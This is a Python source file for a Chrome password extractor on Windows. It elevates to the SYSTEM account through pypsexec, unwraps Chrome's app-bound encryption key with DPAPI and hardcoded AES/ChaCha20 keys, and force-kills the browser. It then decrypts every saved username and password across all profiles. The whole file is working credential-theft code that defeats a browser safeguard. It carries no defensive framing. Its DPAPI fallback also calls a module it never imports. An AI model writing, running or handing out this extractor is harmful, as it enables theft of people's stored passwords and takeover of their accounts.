import ctypes
import sys
import time
import os
import json
import binascii
import shutil
from pypsexec.client import Client
from Crypto.Cipher import AES, ChaCha20_Poly1305
import sqlite3
from pathlib import Path
from colorama import init, Fore, Style

# Initialize colorama for colored console output
init()


class ChromePasswordExtractor:
    def __init__(self, profile_path: str = None):
        """Initialize Chrome password extractor with optional custom profile path."""
        self.browser_name = "Chrome"
        self.profile_path = self._validate_profile_path(profile_path)
        self.local_state_path = self._get_local_state_path()

    def _get_default_path(self) -> str:
        """Retrieve the default Chrome user data path for Windows."""
        return os.path.normpath(
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
        )

    def _validate_profile_path(self, profile_path: str) -> str:
        """Validate the provided profile path or fall back to the default."""
        if profile_path:
            path = Path(profile_path)
            if not path.exists():
                raise ValueError(
                    f"{Fore.RED}Profile path does not exist: {profile_path}{Style.RESET_ALL}"
                )
            return str(path)
        return self._get_default_path()

    def _get_local_state_path(self) -> str:
        """Construct the path to Chrome's Local State file."""
        return os.path.join(self.profile_path, "Local State")

    def get_secret_key(self) -> bytes:
        """Retrieve and decrypt Chrome's secret key from the Local State file."""
        try:
            with open(self.local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]

            # Check if running as administrator
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print(
                    f"{Fore.RED}This script requires administrator privileges for Chrome key decryption{Style.RESET_ALL}"
                )
                return None

            c = Client("localhost")
            c.connect()
            try:
                c.create_service()
                time.sleep(2)  # Wait for service to be fully created

                assert binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB"
                app_bound_encrypted_key_b64 = (
                    binascii.b2a_base64(
                        binascii.a2b_base64(app_bound_encrypted_key)[4:]
                    )
                    .decode()
                    .strip()
                )

                # Decrypt with SYSTEM DPAPI
                arguments = (
                    '-c "'
                    + """import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
""".replace(
                        "\n", ";"
                    )
                    + '"'
                )
                encrypted_key_b64, stderr, rc = c.run_executable(
                    sys.executable,
                    arguments=arguments.format(app_bound_encrypted_key_b64),
                    use_system_account=True,
                )

                # Decrypt with user DPAPI
                decrypted_key_b64, stderr, rc = c.run_executable(
                    sys.executable,
                    arguments=arguments.format(encrypted_key_b64.decode().strip()),
                    use_system_account=False,
                )

                decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]

                # Decrypt key with AES256GCM or ChaCha20Poly1305
                aes_key = bytes.fromhex(
                    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787"
                )
                chacha20_key = bytes.fromhex(
                    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"
                )
                flag = decrypted_key[0]
                iv = decrypted_key[1 : 1 + 12]
                ciphertext = decrypted_key[1 + 12 : 1 + 12 + 32]
                tag = decrypted_key[1 + 12 + 32 :]

                if flag == 1:
                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
                elif flag == 2:
                    cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
                else:
                    raise ValueError(
                        f"{Fore.RED}Unsupported flag: {flag}{Style.RESET_ALL}"
                    )

                return cipher.decrypt_and_verify(ciphertext, tag)
            finally:
                try:
                    time.sleep(2)  # Wait before cleanup
                    c.remove_service()
                    c.disconnect()
                except Exception as e:
                    print(
                        f"{Fore.YELLOW}Warning: Error during cleanup: {str(e)}{Style.RESET_ALL}"
                    )
                    try:
                        time.sleep(5)
                        c.remove_service()
                        c.disconnect()
                    except:
                        print(
                            f"{Fore.YELLOW}Warning: Could not clean up service properly. You may need to restart your computer.{Style.RESET_ALL}"
                        )
        except Exception as e:
            print(f"{Fore.RED}Error getting secret key: {str(e)}{Style.RESET_ALL}")
            return None

    def decrypt_password(
        self, ciphertext: bytes, secret_key: bytes, profile: str = "", url: str = ""
    ) -> str:
        """Decrypt a password using the provided secret key."""
        if not ciphertext:
            return None
        if ciphertext.startswith(b"v20"):
            try:
                iv = ciphertext[3:15]
                encrypted_password = ciphertext[15:-16]
                tag = ciphertext[-16:]
                cipher = AES.new(secret_key, AES.MODE_GCM, nonce=iv)
                decrypted_pass = cipher.decrypt_and_verify(encrypted_password, tag)
                return decrypted_pass.decode("utf-8")
            except Exception as e:
                print(
                    f"{Fore.RED}Error decrypting v20 password for profile {profile}, URL {url}: {str(e)}{Style.RESET_ALL}"
                )
                return None
        elif ciphertext.startswith(b"v10"):
            try:
                iv = ciphertext[3:15]
                encrypted_password = ciphertext[15:-16]
                tag = ciphertext[-16:]
                cipher = AES.new(secret_key, AES.MODE_GCM, nonce=iv)
                decrypted_pass = cipher.decrypt_and_verify(encrypted_password, tag)
                return decrypted_pass.decode("utf-8")
            except Exception as e:
                print(
                    f"{Fore.RED}Error decrypting v10 password for profile {profile}, URL {url}: {str(e)}{Style.RESET_ALL}"
                )
                return None
        else:
            try:
                decrypted_pass = win32crypt.CryptUnprotectData(
                    ciphertext, None, None, None, 0
                )[1]
                return decrypted_pass.decode("utf-8")
            except Exception as e:
                print(
                    f"{Fore.RED}Error decrypting DPAPI password for profile {profile}, URL {url}: {str(e)}{Style.RESET_ALL}"
                )
                return None

    def get_db_connection(self, login_db_path: str) -> sqlite3.Connection:
        """Create a temporary copy of the Login Data database and establish a connection."""
        try:
            if not os.path.exists(login_db_path):
                print(
                    f"{Fore.RED}Database file not found: {login_db_path}{Style.RESET_ALL}"
                )
                return None
            temp_path = "Loginvault.db"
            shutil.copy2(login_db_path, temp_path)
            return sqlite3.connect(temp_path)
        except Exception as e:
            print(f"{Fore.RED}Error connecting to database: {str(e)}{Style.RESET_ALL}")
            return None

    def get_login_data_paths(self, base_path: str = None) -> list:
        """Retrieve paths to all Login Data files, including the root profile."""
        paths = []
        if base_path and os.path.isfile(base_path):
            profile_name = os.path.basename(os.path.dirname(base_path)) or "Root"
            paths.append((base_path, profile_name))
        else:
            base_path = base_path or self.profile_path
            root_login_data = os.path.join(base_path, "Login Data")
            if os.path.exists(root_login_data):
                paths.append((root_login_data, "Root"))
            for folder in os.listdir(base_path):
                if folder.startswith("Profile") or folder == "Default":
                    login_data_path = os.path.join(base_path, folder, "Login Data")
                    if os.path.exists(login_data_path):
                        paths.append((login_data_path, folder))
        return paths

    def kill_browser_process(self):
        """Terminate Chrome processes to prevent file access conflicts."""
        os.system("taskkill /F /IM chrome.exe /T 2>nul")
        time.sleep(1)

    def extract_passwords(self, output_path=None) -> list:
        """Extract passwords from all Chrome profiles and return credentials list."""
        credentials = []
        self.kill_browser_process()
        if os.path.isfile(self.profile_path):
            login_data_paths = self.get_login_data_paths(self.profile_path)
            secret_key = self.get_secret_key()
            if not secret_key:
                print(
                    f"{Fore.RED}Failed to get secret key for {self.profile_path}{Style.RESET_ALL}"
                )
                return credentials
        else:
            login_data_paths = self.get_login_data_paths()
            secret_key = self.get_secret_key()
            if not secret_key:
                print(f"{Fore.RED}Failed to get secret key{Style.RESET_ALL}")
                return credentials

        if not login_data_paths:
            print(
                f"{Fore.RED}No profiles with 'Login Data' found in {self.profile_path}{Style.RESET_ALL}"
            )
            return credentials

        for login_db_path, profile in login_data_paths:
            print(
                f"{Fore.CYAN}Extracting from Chrome profile: {profile}{Style.RESET_ALL}"
            )
            conn = self.get_db_connection(login_db_path)
            if not conn:
                continue
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            for row in cursor.fetchall():
                origin_url, username, ciphertext = row
                if origin_url and username and ciphertext:
                    password = self.decrypt_password(
                        ciphertext, secret_key, profile, origin_url
                    )
                    if password:
                        credentials.append(
                            {
                                "browser": self.browser_name,
                                "profile": profile,
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )
            cursor.close()
            conn.close()
            if os.path.exists("Loginvault.db"):
                os.remove("Loginvault.db")
        return credentials
